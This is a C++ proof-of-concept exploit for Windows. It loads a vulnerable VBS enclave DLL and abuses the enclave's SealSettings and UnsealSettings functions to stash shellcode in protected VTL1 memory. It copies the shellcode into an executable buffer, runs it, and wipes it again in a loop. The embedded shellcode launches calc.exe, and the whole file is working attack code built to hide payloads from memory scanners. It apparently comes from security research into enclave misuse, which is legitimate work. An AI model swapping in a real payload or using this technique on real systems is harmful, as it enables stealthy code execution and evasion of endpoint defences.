#include <iostream>
#include <winenclave.h>
#include <wchar.h>


typedef void* INIT_TAG;

typedef struct _prefs_init {
    char* init_name;
} PREFS_INIT;

typedef struct _seal_args {
    INIT_TAG config_ll;
    unsigned char* data_to_seal;
    unsigned char* protectedBlob;
    DWORD sz_data_to_seal;
    DWORD sz_protected_blob_size;
} SEAL_ARGS;

typedef struct _unseal_args {
    INIT_TAG config_ll;
    unsigned char* protected_blob;
    unsigned char* unsealed_data;
    DWORD sz_protected_blob;
    DWORD unsealed_size;
    DWORD unsealed_size_max;
} UNSEAL_ARGS;

VOID PrintBuffer(void* buffer, int len)
{
    unsigned char* bytePtr = (unsigned char*)buffer;
    for (size_t i = 0; i < len; ++i) {
        printf("%02X ", bytePtr[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

PVOID LoadVulnerableEnclave(const WCHAR* enclave_path)
{
    if (!IsEnclaveTypeSupported(ENCLAVE_TYPE_VBS))
    {
        printf("VBS Enclave not supported\n");
        return 0;
    }
    constexpr ENCLAVE_CREATE_INFO_VBS CreateInfo
    {
        0, // non-debuggable enclave
        { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 }, // OwnerID
    };

    PVOID Enclave = CreateEnclave(GetCurrentProcess(),
        NULL,
        0x10000000, // size
        0,
        ENCLAVE_TYPE_VBS,
        &CreateInfo,
        sizeof(ENCLAVE_CREATE_INFO_VBS),
        NULL);

    if (!LoadEnclaveImageW(Enclave, enclave_path))
    {
        printf("Failed to load enclave image\n");
        return 0;
    }

    ENCLAVE_INIT_INFO_VBS InitInfo{};
    InitInfo.ThreadCount = 1;
    InitInfo.Length = sizeof(ENCLAVE_INIT_INFO_VBS);

    InitializeEnclave(GetCurrentProcess(),
        Enclave,
        &InitInfo,
        InitInfo.Length,
        nullptr);

    printf("[*] Loaded vulnerable enclave at: %p\n", Enclave);
    return Enclave;
}

// Initialize the vulnerable "prefs_enclave_x64.dll" enclave using its "Init" function
INIT_TAG InitializeVulnerableEnclave(HANDLE Enclave)
{
    LPENCLAVE_ROUTINE InitFunction = (LPENCLAVE_ROUTINE)GetProcAddress((HMODULE)Enclave, "Init");
    char init_name[] = "testtest";
    PREFS_INIT init_args{};
    init_args.init_name = init_name;
    INIT_TAG llconfig = 0;
    CallEnclave(InitFunction, &init_args, TRUE, (void**)&llconfig);

    printf("[*] Called vulnerable enclave init function, config at: %p\n", llconfig);
    return llconfig;
}

DWORD EnclaveSealWrapper(unsigned char* data, DWORD size, INIT_TAG llconfig, HANDLE Enclave, unsigned char* address)
{

    LPENCLAVE_ROUTINE SealFunction = (LPENCLAVE_ROUTINE)GetProcAddress((HMODULE)Enclave, "SealSettings");

    SEAL_ARGS seal_args{};
    seal_args.config_ll = llconfig;
    seal_args.data_to_seal = data; 
    seal_args.sz_data_to_seal = size;
    seal_args.protectedBlob = NULL;
    seal_args.sz_protected_blob_size = 0;

    // Call "SealSettings" without a destination address to calculate the size required for the encrypted data
    void* szNeeded;
    CallEnclave(SealFunction, &seal_args, TRUE, &szNeeded);

    // Address to write the encrypted data to
    seal_args.protectedBlob = address; 
    seal_args.sz_protected_blob_size = (DWORD)szNeeded;

    // Seal the data to a blob inside the enclave.
    CallEnclave(SealFunction, &seal_args, TRUE, &szNeeded);
    return (DWORD)szNeeded;
}

int EnclaveUnsealWrapper(INIT_TAG llconfig, HANDLE Enclave, PVOID unsealAddress, unsigned char* sealedAddress, DWORD sealedSize, DWORD unsealedSize)
{
    LPENCLAVE_ROUTINE UnsealFunction = (LPENCLAVE_ROUTINE)GetProcAddress((HMODULE)Enclave, "UnsealSettings");

    UNSEAL_ARGS unseal{};
    unseal.config_ll = llconfig;
    unseal.protected_blob = sealedAddress;
    unseal.sz_protected_blob = sealedSize;
    unseal.unsealed_size = unsealedSize;
    unseal.unsealed_size_max = unsealedSize;

    // Address to store the decrypted data to
    unseal.unsealed_data = (unsigned char*)unsealAddress;

    // Decrypt the data and write it to the specified address
    CallEnclave(UnsealFunction, &unseal, TRUE, (void**)&sealedSize);

    return 0;
}

int main()
{
    // Load the vulnerable enclave into the process
    HANDLE Enclave = LoadVulnerableEnclave(L"..\\..\\prefs_enclave_x64.dll");

    // Call the vulnerable enclave initialization routine
    INIT_TAG llconfig = InitializeVulnerableEnclave(Enclave);
    if (llconfig == 0)
    {
        printf("Failed to initialize vulnerable enclave\n");
        return 0;
    }

    // Sample shellcode - launches calc.exe
    unsigned char shellcode[] = "\x49\x89\xE7\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6\x4C\x89\xFC\xC3";


    // Cleanup buffer - this data will be used to wipe the shellcode from VTL0 using the enclave vulnerability
    unsigned char cleanup[sizeof(shellcode)] = { 0 };

    // llconfig contains an address inside the enclave. Add an offset to this address and use it store our shellcode in VTL1.
    unsigned char* shellcode_vtl1_address = (unsigned char*)llconfig + 100;

    // Trigger the vulnerable "SealSettings" function to encrypt the shellcode and write it into VTL1
    DWORD szNeededShellcode = EnclaveSealWrapper(shellcode, sizeof(shellcode), llconfig, Enclave, shellcode_vtl1_address);
    printf("[*] Written encrypted shellcode to VTL1 at address: %p\n", shellcode_vtl1_address);

    // Trigger the vulnerable "SealSettings" function to encrypt the cleanup buffer and write it into VTL1
    unsigned char* cleanup_buffer_vtl1_address = (unsigned char*)llconfig + 100 + szNeededShellcode;
    DWORD szNeededCleanup = EnclaveSealWrapper(cleanup, sizeof(shellcode), llconfig, Enclave, cleanup_buffer_vtl1_address);
    printf("[*] Written cleanup data to VTL1 at address: %p\n", cleanup_buffer_vtl1_address);

    // Allocate a RWX buffer in VTL0 that will later be used to host the shellcode
    PVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("[*] Allcoated RWX memory for shellcode at : %p\n", mem);
    unsigned char* mem_ptr = (unsigned char*)mem;

    while (1)
    {
        // Trigger the vulnerable "UnsealSettings" function to decrypt the shellcode in VTL1 and write it into the VTL0 buffer
        EnclaveUnsealWrapper(llconfig, Enclave, mem, shellcode_vtl1_address, szNeededShellcode, sizeof(shellcode));
        printf("[*] Written shellcode from VTL1 to VTL0 using the vulnerability to : %p\n", mem);
        printf("[*] Demo - read some data from the RWX buffer: ");
        PrintBuffer(mem, 16);

        printf("[*] Jumping to shellcode\n");
        ((DWORD(*)())mem)();

        // Trigger the vulnerable "UnsealSettings" function to decrypt the cleanup buffer in VTL1 and overwrite the VTL0 buffer
        EnclaveUnsealWrapper(llconfig, Enclave, mem, cleanup_buffer_vtl1_address, szNeededCleanup, sizeof(shellcode));

        printf("[*] Overwritten shellcode with cleanup buffer \n");
        printf("[*] Demo - read some data from the RWX buffer: ");
        PrintBuffer(mem, 16);

        printf("[*] Sleeping for 5 seconds\n");
        Sleep(5000);
    }


}

